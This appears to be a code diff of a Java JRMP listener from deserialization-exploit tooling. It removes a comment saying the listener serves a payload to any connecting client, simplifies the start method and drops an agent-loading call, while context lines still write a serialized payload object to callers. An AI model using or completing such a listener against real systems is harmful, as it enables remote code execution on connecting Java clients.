@@ -13,18 +13,6 @@ import java.rmi.MarshalException;
 import java.rmi.server.ObjID;
 import java.rmi.server.UID;
 import java.util.Arrays;
-//import ysoserial.payloads.util.Reflections;
-
-
-/**
- * Generic JRMP listener
- *
- * Opens up an JRMP listener that will deliver the specified payload to any
- * client connecting to it and making a call.
- *
- * @author mbechler
- *
- */
 @SuppressWarnings ( {
         "restriction"
 } )
@@ -76,11 +64,10 @@ public class JRMPListener implements Runnable {
         }
     }
 
-    public void start (int port,Object payloadObject)throws Exception {
+    public void start ()throws Exception {
         try {
             System.err.println("* Opening JRMP listener on " + port);
-            JRMPListener c = new JRMPListener(port, payloadObject);
-            c.run();
+            run();
         }
         catch ( Exception e ) {
             System.err.println("Listener error");
@@ -242,7 +229,6 @@ public class JRMPListener implements Runnable {
         oos.writeByte(TransportConstants.ExceptionalReturn);
         new UID().write(oos);
 
-        new AgentLoader("org.example.JRMPListener").loadPOJONodeAgent();
 
         oos.writeObject(payloadObject);
 
